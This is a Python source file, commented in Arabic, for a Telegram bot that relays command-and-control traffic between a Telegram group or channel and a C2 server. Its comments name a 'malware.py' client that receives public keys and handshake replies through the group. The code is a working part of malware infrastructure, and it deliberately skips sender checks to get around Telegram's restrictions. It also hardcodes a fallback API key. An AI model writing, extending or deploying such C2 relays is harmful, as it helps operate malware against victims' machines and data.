"""
C2 Telegram Relay Bot — وسيط فقط
================================
لا يستقبل أوامر من البشر ولا من الخاص.

• الداشبورد / السيرفر يبعتوا للشات عبر c2_server مباشرة (HTTP → Telegram API).
• هذا البوت يعمل polling للجروب المحدد وللقناة (البوت لازم يكون أدمن في القناة).
• لا يُستقبل للتحكم من البشر؛ يُمرَّر فقط أسطر البروتوكول KEY_REQUEST:/HANDSHAKE:/RESULT:/HEARTBEAT:
  من الجروب أو القناة المضبوطين، بغض النظر عن المرسل — لتفادي حظر التيليجرام بعد تقييد البوت أو خصوصية المجموعة.
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import json
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes

# ── Config ────────────────────────────────────────────────────────────
BASE_DIR        = os.path.dirname(os.path.abspath(__file__))
TELEGRAM_CONFIG = os.path.join(BASE_DIR, "telegram_config.json")
C2_URL          = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
C2_KEY          = os.environ.get("C2_API_KEY", "c2_super_secret_key_2026_123456")
C2_HEADERS      = {"X-API-Key": C2_KEY, "Content-Type": "application/json"}

_cfg: dict = {}
try:
    if os.path.isfile(TELEGRAM_CONFIG):
        with open(TELEGRAM_CONFIG, "r", encoding="utf-8") as f:
            _cfg = json.load(f)
except Exception as e:
    print(f"⚠️  Could not read telegram_config.json: {e}")

from modules.c2_telegram_ids import resolve_c2_chats

C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(_cfg)
_C2_PREFIXES    = ("KEY_REQUEST:", "HANDSHAKE:", "RESULT:", "HEARTBEAT:")


def _load_token() -> str:
    try:
        if os.path.exists(TELEGRAM_CONFIG):
            with open(TELEGRAM_CONFIG, "r", encoding="utf-8") as f:
                cfg = json.load(f)
            token = cfg.get("token", "").strip()
            if token:
                print(f"✅ Token loaded from {TELEGRAM_CONFIG}")
                return token
    except Exception as e:
        print(f"⚠️  Could not load telegram_config.json: {e}")
    return os.environ.get("TELEGRAM_BOT_TOKEN", "")


async def _send_protocol_reply(context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
    """
    malware.py يستمع على الجروب فقط — PUBLIC_KEY و HANDSHAKE_OK لازم توصل للجروب مباشرة.
    """
    try:
        await context.bot.send_message(chat_id=int(C2_GROUP_ID), text=text)
    except Exception as e:
        print(f"[relay → group] {e}")


async def handle_c2_protocol(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """جروب مناقشة أو القناة → يمرّر نص البروتوكول إلى C2."""
    msg = update.effective_message
    if not msg or not msg.text:
        return

    text = msg.text.strip()
    if not any(text.startswith(p) for p in _C2_PREFIXES):
        return

    chat_key = str(msg.chat.id)
    if chat_key != C2_GROUP_ID and chat_key != C2_CHANNEL_ID:
        return

    # لا نفلتر المرسل لأسطر البروتوكول: بعد تقييد البوت أو خصوصية المجموعة قد يصل نفس السطر
    # بمرسل لا يُصنَّف كبوت (مثلاً مناقشة القناة)، بينما رد السيرفر للـ [C2-Server] يبدو «شغال»
    # لأن مساره أو التوقيت يختلف. السيرفر يتحقق تشفيرياً من HANDSHAKE/RESULT.

    try:
        r = requests.post(
            f"{C2_URL}/internal/tg_message",
            json={"text": text},
            headers=C2_HEADERS,
            timeout=10,
        )
        reply = r.json().get("reply")
        if reply:
            await _send_protocol_reply(context, reply)
    except Exception as e:
        print(f"[C2 protocol handler] error: {e}")


async def error_handler(update, context):
    print(f"GLOBAL ERROR: {context.error}")


if __name__ == "__main__":
    TOKEN = _load_token()
    if not TOKEN:
        print("❌ No bot token found!")
        print("   Add the token via the Dashboard → Telegram page, then restart bot.py")
        sys.exit(1)

    app = (
        ApplicationBuilder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .build()
    )

    # القناة: KEY_REQUEST وغيره يصل كـ channel_post إذا كان البوت أدمن في القناة
    app.add_handler(
        MessageHandler(
            filters.TEXT & filters.Chat(chat_id=int(C2_CHANNEL_ID)),
            handle_c2_protocol,
        )
    )
    # الجروب (مناقشة القناة أو أي سوبر جروب مضبوط بنفس المعرف)
    app.add_handler(
        MessageHandler(
            filters.TEXT & filters.Chat(chat_id=int(C2_GROUP_ID)),
            handle_c2_protocol,
        )
    )
    app.add_error_handler(error_handler)

    print("🤖 C2 Relay — جروب + قناة؛ أسطر البروتوكول تُمرَّر للسيرفر بغض النظر عن مرسل الجروب")
    print(f"   C2 Server: {C2_URL}")
    print(f"   C2 group: {C2_GROUP_ID}  |  C2 channel: {C2_CHANNEL_ID}")
    app.run_polling()
